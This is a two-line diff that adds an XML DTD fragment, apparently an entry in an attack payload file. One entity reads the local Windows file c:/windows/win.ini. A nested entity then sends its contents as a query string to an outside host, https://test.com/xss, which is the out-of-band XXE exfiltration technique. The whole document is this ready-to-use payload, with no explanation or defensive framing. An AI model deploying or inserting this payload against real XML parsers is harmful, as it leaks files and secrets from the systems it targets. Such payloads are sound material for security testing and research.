@@ -1,0 +1,2 @@
+<!ENTITY % charlie SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % bravo "<!ENTITY &#x25; delta SYSTEM 'https://test.com/xss?%charlie;'>">
